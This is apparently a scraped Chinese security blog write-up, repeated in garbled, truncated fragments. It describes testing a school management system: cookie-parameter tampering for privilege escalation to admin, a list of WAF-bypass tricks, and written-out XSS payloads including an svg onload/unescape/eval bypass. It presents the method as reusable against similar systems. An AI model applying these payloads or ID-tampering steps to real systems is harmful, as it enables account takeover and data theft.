","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:2","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#注意"},{"categories":["学习"],"content":" 越权测试翻了翻功能点发现有个修改密码，哎！好像这类一般有越权修改密码哦！开搞 点击修改密码抓包： 发现可以修改的参数都在 cookie 里面： ASP.NET_SessionId 这一看就是加密签名咯（能力有限留给逆向大佬） OA_User=id=54598 （感觉跟用户 id 有关系） unumber 和 ip 分别是用户名和 IP 地址（感觉也没法改） Powerid= 6 (这个个位数参数猜测是权限上面的） （注意）这里面我在每一次点击功能点时会连续抓取 4~5 个包，为了达成越权目的必须确保每一个数据包都进行修改！！ 尝试修改 OA_User=id= 54597 （先减一位然后再减一位） 发现对应的用户名也是对应着改变，（只是不和 id 匹配） 哎！这不就是直接可以越权修改密码！水平越权有了！ 扩展：垂直越权不过这些都是修改 OA_User=id= 发现都是便利的一些学生 id，就想下能不能 get 到教师或者管理员 记得还有个参数 Powerid= 6 便利学生的时候就发现有些 id 是遍历不出来的（这些可能就是管理员/教师）其中就有一个 id 是 5. 为了方便确定信息这次点击个人基本信息 1.通过遍历结果尝试修改 OA_User=id=54590 powerid=5 发现和我猜测的一样 ‘5’ 就是教师权限！拿到老师权限同样也是可以直接越权修改老师密码! 2.老师权限都试出来了，就想着管理员！！！ 划重点这里,通过遍历发现 40000-55000 都是可以便利的点,管理员这里面并没有出现! 所以说:一般这种系统管理员权限特殊会比较特殊，根据小编多年扣脚的经验 ，管理员 id=1，（这一点适用于大多数管理系统），同时权限做出的是数字越小权限越大，这里 powerid=1 放包注意和上面一样 成功拿到管理员权限！泄露大量账号密码信息： 测试添加用户 直接可以任意添加管理员和导师账户！（声明：所有测试账户均已经删除，仅为测试所用） 同样，进行功能点抓包修改可以越权修改管理员密码！ ","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:2","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#扩展垂直越权"},{"categories":["学习"],"content":" 越权测试翻了翻功能点发现有个修改密码，哎！好像这类一般有越权修改密码哦！开搞 点击修改密码抓包： 发现可以修改的参数都在 cookie 里面： ASP.NET_SessionId 这一看就是加密签名咯（能力有限留给逆向大佬） OA_User=id=54598 （感觉跟用户 id 有关系） unumber 和 ip 分别是用户名和 IP 地址（感觉也没法改） Powerid= 6 (这个个位数参数猜测是权限上面的） （注意）这里面我在每一次点击功能点时会连续抓取 4~5 个包，为了达成越权目的必须确保每一个数据包都进行修改！！ 尝试修改 OA_User=id= 54597 （先减一位然后再减一位） 发现对应的用户名也是对应着改变，（只是不和 id 匹配） 哎！这不就是直接可以越权修改密码！水平越权有了！ 扩展：垂直越权不过这些都是修改 OA_User=id= 发现都是便利的一些学生 id，就想下能不能 get 到教师或者管理员 记得还有个参数 Powerid= 6 便利学生的时候就发现有些 id 是遍历不出来的（这些可能就是管理员/教师）其中就有一个 id 是 5. 为了方便确定信息这次点击个人基本信息 1.通过遍历结果尝试修改 OA_User=id=54590 powerid=5 发现和我猜测的一样 ‘5’ 就是教师权限！拿到老师权限同样也是可以直接越权修改老师密码! 2.老师权限都试出来了，就想着管理员！！！ 划重点这里,通过遍历发现 40000-55000 都是可以便利的点,管理员这里面并没有出现! 所以说:一般这种系统管理员权限特殊会比较特殊，根据小编多年扣脚的经验 ，管理员 id=1，（这一点适用于大多数管理系统），同时权限做出的是数字越小权限越大，这里 powerid=1 放包注意和上面一样 成功拿到管理员权限！泄露大量账号密码信息： 测试添加用户 直接可以任意添加管理员和导师账户！（声明：所有测试账户均已经删除，仅为测试所用） 同样，进行功能点抓包修改可以越权修改管理员密码！ ","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:2","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#划重点"},{"categories":["学习"],"content":" XSS（经典绕 waf）既然我能越权至教师账户，那就接着试一试 xss 在教师的功能点里面有一个学生信息列表，可以直接读取学生个人信息 同时学生信息可以上传这些信息，那不是多好的储存型 xss 模板 话不多说开测： 测试最基础的 payload\u003cscript\u003ealert(1)\u003c/script\u003e 初步测试只有专业特长和姓名没有输入限制，（别的只能是纯数字） 好好好，这一下算是踢到软柿子中的最硬的了–waf (吗喽痛苦) 不过都到这里了，怎么也要绕一下！ xss 绕 waf绕过一般思路! 一、更改提交方式 在默认配置下，为了节省资源，许多 WAF 只会对 GET 请求进行过滤拦截，而忽略了对 POST 请求、Cookie、HTTP Header 等其他提交方式的检测。因此，攻击者可以尝试更改有害语句的提交方式，如将 GET 请求修改为 POST 请求，或者通过 Cookie、HTTP Header 等方式提交恶意脚本，以绕过 WAF 的拦截。 二、混淆伪装绕过 混淆伪装是一种常见的绕过 WAF 的手段，攻击者通过编码、大小写混淆、双写、转义字符等方式对恶意脚本进行伪装，使其绕过 WAF 的关键词过滤规则。例如，将 JavaScript 代码中的关键字进行大小写混淆（如\u003cscriPT\u003e），或者使用 Unicode 编码、Base64 编码等方式对代码进行编码。 三、标签和事件函数变换 XSS 攻击主要是通过触发 HTML 标签中的事件函数来执行恶意脚本。因此，WAF 会重点识别能够触发事件函数的 HTML 标签和事件函数字段。攻击者可以尝试使用其他可以执行 JavaScript 代码的 HTML 标签（如\u003csvg\u003e, \u003cbutton\u003e, \u003cimg\u003e等）替换常用的\u003cscript\u003e标签，或者使用其他事件函数（如 onerror, oninput, onmousedown 等）替换常用的 onclick 事件函数，以绕过 WAF 的拦截。 四、利用 WAF 的缺陷和配置不当 「增加 WAF 负担」：有些 WAF 在处理大量数据时可能会降低检测精度或放弃检测部分数据包。攻击者可以通过向 WAF 发送大量正常数据包并夹杂异常数据包的方式，增加 WAF 的负担，从而绕过 WAF 的检测。 「利用 WAF 配置不当」：WAF 的配置可能存在漏洞或不当之处，如只检测部分参数、忽略某些类型的请求等。攻击者可以通过分析 WAF 的配置规则，构造绕过 WAF 检测的请求。 「旁站绕过」：在某些情况下，网站管理员可能只对主站进行了 WAF 防护，而忽略了旁站或子域名的防护。攻击者可以尝试通过旁站或子域名绕过 WAF 的防护。 五、使用自动化工具 自动化工具如 XSStrike 等可以帮助攻击者自动测试 WAF 的防护效果，并生成绕过 WAF 的 payload。这些工具通常包含多种绕过 WAF 的技巧和策略，可以显著提高攻击的成功率。 XSStrike 开源地址：https://github.com/s0md3v/XSStrike 六、其他技巧 「利用伪协议」：某些 HTML 属性支持伪协议（如 javascript:），攻击者可以利用这些属性执行恶意脚本。 「利用 CSS 跨站」：在某些情况下，攻击者可以利用 CSS 中的某些特性（如 expression()）执行 JavaScript 代码。 「利用全局变量和函数」：JavaScript 中的全局变量和函数（如 eval(), window.onload 等）可以在不直接引用脚本标签的情况下执行代码，攻击者可以尝试利用这些变量和函数绕过 WAF 的防护。 这里进行一个一个尝试 1.大小写绕过\u003csCript\u003ealert(1)\u003c/Script\u003e 2、双写绕过(不行)\u003csCri\u003cscript\u003ealert(1)\u003c/script\u003eSC\u003cscript\u003eripT\u003e 3.img 标签\u003cimg src\\\\=15 onerror\\\\=(function(){alert(15)})()\u003e 4、onmouseover 事件\u003ca onmousemove\\\\=\"do something here\"\u003e\\` 当用户鼠标移动时即可运行代码 5、主动闭合标签实现注入代码 6.绕过 HTML 注释符 7.利用换行符绕过\u003cimg/src\\\\=14 onerror\\\\=window.alert(14)\u003e 崩溃,我是真的崩溃!!!，上字典开跑 最后也是跑出来了一个！！！ 发现使用 \u003csvg\u003e 标签和 onload 事件： 利用 \u003csvg\u003e 标签的 onload 事件触发 JavaScript 代码执行,使用 unescape 和 eval 结合的方式，对代码进行混淆和编码,将字符串 'alert(1)' 编码为 '%61%6c%65%72%74%28%31%29'，然后通过 unescape 将其还原，再使用 eval 执行还原后的代码 推测目标服务器:缺乏对动态代码执行的检测，或检测机制不足以处理复杂的动态执行逻辑。对常见的 onclick、onmouseover 等事件进行了更严格的过滤，但对 onload 事件的过滤不足。通过 onload 事件触发执行，绕过了可能针对其他事件（如 onclick、onmouseover）的过滤。可以尝试其他不常见但有效的事件（如 onfocus、onerror）进行绕过。服务器可能没有对 URI 编码（如 %61%6c%65%72%74%28%31%29）进行解码并检查。这表示过滤器可能缺乏对编码/解码操作的深度检测。 牛掰,还是网传的字典牛掰,自己还得练 最终也是终于弹出来了 ","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:3","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#xss经典绕-waf"},{"categories":["学习"],"content":" XSS（经典绕 waf）既然我能越权至教师账户，那就接着试一试 xss 在教师的功能点里面有一个学生信息列表，可以直接读取学生个人信息 同时学生信息可以上传这些信息，那不是多好的储存型 xss 模板 话不多说开测： 测试最基础的 payload 初步测试只有专业特长和姓名没有输入限制，（别的只能是纯数字） 好好好，这一下算是踢到软柿子中的最硬的了–waf (吗喽痛苦) 不过都到这里了，怎么也要绕一下！ xss 绕 waf绕过一般思路! 一、更改提交方式 在默认配置下，为了节省资源，许多 WAF 只会对 GET 请求进行过滤拦截，而忽略了对 POST 请求、Cookie、HTTP Header 等其他提交方式的检测。因此，攻击者可以尝试更改有害语句的提交方式，如将 GET 请求修改为 POST 请求，或者通过 Cookie、HTTP Header 等方式提交恶意脚本，以绕过 WAF 的拦截。 二、混淆伪装绕过 混淆伪装是一种常见的绕过 WAF 的手段，攻击者通过编码、大小写混淆、双写、转义字符等方式对恶意脚本进行伪装，使其绕过 WAF 的关键词过滤规则。例如，将 JavaScript 代码中的关键字进行大小写混淆（如 2、双写绕过(不行)","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:3","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#测试最基础的-payload"},{"categories":["学习"],"content":" XSS（经典绕 waf）既然我能越权至教师账户，那就接着试一试 xss 在教师的功能点里面有一个学生信息列表，可以直接读取学生个人信息 同时学生信息可以上传这些信息，那不是多好的储存型 xss 模板 话不多说开测： 测试最基础的 payload 初步测试只有专业特长和姓名没有输入限制，（别的只能是纯数字） 好好好，这一下算是踢到软柿子中的最硬的了–waf (吗喽痛苦) 不过都到这里了，怎么也要绕一下！ xss 绕 waf绕过一般思路! 一、更改提交方式 在默认配置下，为了节省资源，许多 WAF 只会对 GET 请求进行过滤拦截，而忽略了对 POST 请求、Cookie、HTTP Header 等其他提交方式的检测。因此，攻击者可以尝试更改有害语句的提交方式，如将 GET 请求修改为 POST 请求，或者通过 Cookie、HTTP Header 等方式提交恶意脚本，以绕过 WAF 的拦截。 二、混淆伪装绕过 混淆伪装是一种常见的绕过 WAF 的手段，攻击者通过编码、大小写混淆、双写、转义字符等方式对恶意脚本进行伪装，使其绕过 WAF 的关键词过滤规则。例如，将 JavaScript 代码中的关键字进行大小写混淆（如 2、双写绕过(不行)","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:3","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#xss-绕-waf"},{"categories":["学习"],"content":" XSS（经典绕 waf）既然我能越权至教师账户，那就接着试一试 xss 在教师的功能点里面有一个学生信息列表，可以直接读取学生个人信息 同时学生信息可以上传这些信息，那不是多好的储存型 xss 模板 话不多说开测： 测试最基础的 payload 初步测试只有专业特长和姓名没有输入限制，（别的只能是纯数字） 好好好，这一下算是踢到软柿子中的最硬的了–waf (吗喽痛苦) 不过都到这里了，怎么也要绕一下！ xss 绕 waf绕过一般思路! 一、更改提交方式 在默认配置下，为了节省资源，许多 WAF 只会对 GET 请求进行过滤拦截，而忽略了对 POST 请求、Cookie、HTTP Header 等其他提交方式的检测。因此，攻击者可以尝试更改有害语句的提交方式，如将 GET 请求修改为 POST 请求，或者通过 Cookie、HTTP Header 等方式提交恶意脚本，以绕过 WAF 的拦截。 二、混淆伪装绕过 混淆伪装是一种常见的绕过 WAF 的手段，攻击者通过编码、大小写混淆、双写、转义字符等方式对恶意脚本进行伪装，使其绕过 WAF 的关键词过滤规则。例如，将 JavaScript 代码中的关键字进行大小写混淆（如 2、双写绕过(不行)","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:3","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#这里进行一个一个尝试"},{"categories":["学习"],"content":" XSS（经典绕 waf）既然我能越权至教师账户，那就接着试一试 xss 在教师的功能点里面有一个学生信息列表，可以直接读取学生个人信息 同时学生信息可以上传这些信息，那不是多好的储存型 xss 模板 话不多说开测： 测试最基础的 payload 初步测试只有专业特长和姓名没有输入限制，（别的只能是纯数字） 好好好，这一下算是踢到软柿子中的最硬的了–waf (吗喽痛苦) 不过都到这里了，怎么也要绕一下！ xss 绕 waf绕过一般思路! 一、更改提交方式 在默认配置下，为了节省资源，许多 WAF 只会对 GET 请求进行过滤拦截，而忽略了对 POST 请求、Cookie、HTTP Header 等其他提交方式的检测。因此，攻击者可以尝试更改有害语句的提交方式，如将 GET 请求修改为 POST 请求，或者通过 Cookie、HTTP Header 等方式提交恶意脚本，以绕过 WAF 的拦截。 二、混淆伪装绕过 混淆伪装是一种常见的绕过 WAF 的手段，攻击者通过编码、大小写混淆、双写、转义字符等方式对恶意脚本进行伪装，使其绕过 WAF 的关键词过滤规则。例如，将 JavaScript 代码中的关键字进行大小写混淆（如 2、双写绕过(不行)","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:3","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#1大小写绕过"},{"categories":["学习"],"content":" XSS（经典绕 waf）既然我能越权至教师账户，那就接着试一试 xss 在教师的功能点里面有一个学生信息列表，可以直接读取学生个人信息 同时学生信息可以上传这些信息，那不是多好的储存型 xss 模板 话不多说开测： 测试最基础的 payload 初步测试只有专业特长和姓名没有输入限制，（别的只能是纯数字） 好好好，这一下算是踢到软柿子中的最硬的了–waf (吗喽痛苦) 不过都到这里了，怎么也要绕一下！ xss 绕 waf绕过一般思路! 一、更改提交方式 在默认配置下，为了节省资源，许多 WAF 只会对 GET 请求进行过滤拦截，而忽略了对 POST 请求、Cookie、HTTP Header 等其他提交方式的检测。因此，攻击者可以尝试更改有害语句的提交方式，如将 GET 请求修改为 POST 请求，或者通过 Cookie、HTTP Header 等方式提交恶意脚本，以绕过 WAF 的拦截。 二、混淆伪装绕过 混淆伪装是一种常见的绕过 WAF 的手段，攻击者通过编码、大小写混淆、双写、转义字符等方式对恶意脚本进行伪装，使其绕过 WAF 的关键词过滤规则。例如，将 JavaScript 代码中的关键字进行大小写混淆（如 2、双写绕过(不行)","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:3","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#2双写绕过不行"},{"categories":["学习"],"content":" XSS（经典绕 waf）既然我能越权至教师账户，那就接着试一试 xss 在教师的功能点里面有一个学生信息列表，可以直接读取学生个人信息 同时学生信息可以上传这些信息，那不是多好的储存型 xss 模板 话不多说开测： 测试最基础的 payload 初步测试只有专业特长和姓名没有输入限制，（别的只能是纯数字） 好好好，这一下算是踢到软柿子中的最硬的了–waf (吗喽痛苦) 不过都到这里了，怎么也要绕一下！ xss 绕 waf绕过一般思路! 一、更改提交方式 在默认配置下，为了节省资源，许多 WAF 只会对 GET 请求进行过滤拦截，而忽略了对 POST 请求、Cookie、HTTP Header 等其他提交方式的检测。因此，攻击者可以尝试更改有害语句的提交方式，如将 GET 请求修改为 POST 请求，或者通过 Cookie、HTTP Header 等方式提交恶意脚本，以绕过 WAF 的拦截。 二、混淆伪装绕过 混淆伪装是一种常见的绕过 WAF 的手段，攻击者通过编码、大小写混淆、双写、转义字符等方式对恶意脚本进行伪装，使其绕过 WAF 的关键词过滤规则。例如，将 JavaScript 代码中的关键字进行大小写混淆（如 2、双写绕过(不行)","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:3","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#3img-标签"},{"categories":["学习"],"content":" XSS（经典绕 waf）既然我能越权至教师账户，那就接着试一试 xss 在教师的功能点里面有一个学生信息列表，可以直接读取学生个人信息 同时学生信息可以上传这些信息，那不是多好的储存型 xss 模板 话不多说开测： 测试最基础的 payload 初步测试只有专业特长和姓名没有输入限制，（别的只能是纯数字） 好好好，这一下算是踢到软柿子中的最硬的了–waf (吗喽痛苦) 不过都到这里了，怎么也要绕一下！ xss 绕 waf绕过一般思路! 一、更改提交方式 在默认配置下，为了节省资源，许多 WAF 只会对 GET 请求进行过滤拦截，而忽略了对 POST 请求、Cookie、HTTP Header 等其他提交方式的检测。因此，攻击者可以尝试更改有害语句的提交方式，如将 GET 请求修改为 POST 请求，或者通过 Cookie、HTTP Header 等方式提交恶意脚本，以绕过 WAF 的拦截。 二、混淆伪装绕过 混淆伪装是一种常见的绕过 WAF 的手段，攻击者通过编码、大小写混淆、双写、转义字符等方式对恶意脚本进行伪装，使其绕过 WAF 的关键词过滤规则。例如，将 JavaScript 代码中的关键字进行大小写混淆（如 2、双写绕过(不行)","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:3","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#4onmouseover-事件"},{"categories":["学习"],"content":" XSS（经典绕 waf）既然我能越权至教师账户，那就接着试一试 xss 在教师的功能点里面有一个学生信息列表，可以直接读取学生个人信息 同时学生信息可以上传这些信息，那不是多好的储存型 xss 模板 话不多说开测： 测试最基础的 payload 初步测试只有专业特长和姓名没有输入限制，（别的只能是纯数字） 好好好，这一下算是踢到软柿子中的最硬的了–waf (吗喽痛苦) 不过都到这里了，怎么也要绕一下！ xss 绕 waf绕过一般思路! 一、更改提交方式 在默认配置下，为了节省资源，许多 WAF 只会对 GET 请求进行过滤拦截，而忽略了对 POST 请求、Cookie、HTTP Header 等其他提交方式的检测。因此，攻击者可以尝试更改有害语句的提交方式，如将 GET 请求修改为 POST 请求，或者通过 Cookie、HTTP Header 等方式提交恶意脚本，以绕过 WAF 的拦截。 二、混淆伪装绕过 混淆伪装是一种常见的绕过 WAF 的手段，攻击者通过编码、大小写混淆、双写、转义字符等方式对恶意脚本进行伪装，使其绕过 WAF 的关键词过滤规则。例如，将 JavaScript 代码中的关键字进行大小写混淆（如 2、双写绕过(不行)","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:3","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#6绕过-html-注释符"},{"categories":["学习"],"content":" XSS（经典绕 waf）既然我能越权至教师账户，那就接着试一试 xss 在教师的功能点里面有一个学生信息列表，可以直接读取学生个人信息 同时学生信息可以上传这些信息，那不是多好的储存型 xss 模板 话不多说开测： 测试最基础的 payload 初步测试只有专业特长和姓名没有输入限制，（别的只能是纯数字） 好好好，这一下算是踢到软柿子中的最硬的了–waf (吗喽痛苦) 不过都到这里了，怎么也要绕一下！ xss 绕 waf绕过一般思路! 一、更改提交方式 在默认配置下，为了节省资源，许多 WAF 只会对 GET 请求进行过滤拦截，而忽略了对 POST 请求、Cookie、HTTP Header 等其他提交方式的检测。因此，攻击者可以尝试更改有害语句的提交方式，如将 GET 请求修改为 POST 请求，或者通过 Cookie、HTTP Header 等方式提交恶意脚本，以绕过 WAF 的拦截。 二、混淆伪装绕过 混淆伪装是一种常见的绕过 WAF 的手段，攻击者通过编码、大小写混淆、双写、转义字符等方式对恶意脚本进行伪装，使其绕过 WAF 的关键词过滤规则。例如，将 JavaScript 代码中的关键字进行大小写混淆（如 2、双写绕过(不行)","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:3","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#7利用换行符绕过"},{"categories":["学习"],"content":" XSS（经典绕 waf）既然我能越权至教师账户，那就接着试一试 xss 在教师的功能点里面有一个学生信息列表，可以直接读取学生个人信息 同时学生信息可以上传这些信息，那不是多好的储存型 xss 模板 话不多说开测： 测试最基础的 payload 初步测试只有专业特长和姓名没有输入限制，（别的只能是纯数字） 好好好，这一下算是踢到软柿子中的最硬的了–waf (吗喽痛苦) 不过都到这里了，怎么也要绕一下！ xss 绕 waf绕过一般思路! 一、更改提交方式 在默认配置下，为了节省资源，许多 WAF 只会对 GET 请求进行过滤拦截，而忽略了对 POST 请求、Cookie、HTTP Header 等其他提交方式的检测。因此，攻击者可以尝试更改有害语句的提交方式，如将 GET 请求修改为 POST 请求，或者通过 Cookie、HTTP Header 等方式提交恶意脚本，以绕过 WAF 的拦截。 二、混淆伪装绕过 混淆伪装是一种常见的绕过 WAF 的手段，攻击者通过编码、大小写混淆、双写、转义字符等方式对恶意脚本进行伪装，使其绕过 WAF 的关键词过滤规则。例如，将 JavaScript 代码中的关键字进行大小写混淆（如 2、双写绕过(不行)","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:3","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#崩溃我是真的崩溃上字典开跑"},{"categories":["学习"],"content":" XSS（经典绕 waf）既然我能越权至教师账户，那就接着试一试 xss 在教师的功能点里面有一个学生信息列表，可以直接读取学生个人信息 同时学生信息可以上传这些信息，那不是多好的储存型 xss 模板 话不多说开测： 测试最基础的 payload 初步测试只有专业特长和姓名没有输入限制，（别的只能是纯数字） 好好好，这一下算是踢到软柿子中的最硬的了–waf (吗喽痛苦) 不过都到这里了，怎么也要绕一下！ xss 绕 waf绕过一般思路! 一、更改提交方式 在默认配置下，为了节省资源，许多 WAF 只会对 GET 请求进行过滤拦截，而忽略了对 POST 请求、Cookie、HTTP Header 等其他提交方式的检测。因此，攻击者可以尝试更改有害语句的提交方式，如将 GET 请求修改为 POST 请求，或者通过 Cookie、HTTP Header 等方式提交恶意脚本，以绕过 WAF 的拦截。 二、混淆伪装绕过 混淆伪装是一种常见的绕过 WAF 的手段，攻击者通过编码、大小写混淆、双写、转义字符等方式对恶意脚本进行伪装，使其绕过 WAF 的关键词过滤规则。例如，将 JavaScript 代码中的关键字进行大小写混淆（如 2、双写绕过(不行)","date":"2024-09-02","objectID":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/:3:3","series":null,"tags":["信息收集","SRC"],"title":"一次经典教育系统后台漏洞打包","uri":"/%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%85%B8%E6%95%99%E8%82%B2%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E6%BC%8F%E6%B4%9E%E6%89%93%E5%8C%85/#最后也是跑出来了一个"},{"categories":["学习"],"content":" 文件上传 XSS在测试功能点的时候发现存在文件上传点, aspx 语言首先想尝试一句话木马 直接又是不行,这里小编上传木马能力有限,抓包分析 发现他是接收 html 的 尝试用 html 弹出一个 xss 老师界面观察也是成功的打上一下(水平较低) 整体拿下来观察是非常经典的一次后台打包,根据分析该系统普遍存在于学校毕业设计,整体的思路都是通用的,想类似的系统可以多尝试,类似是一种毕设通杀!! (所有增添账号和上传文件均删除) 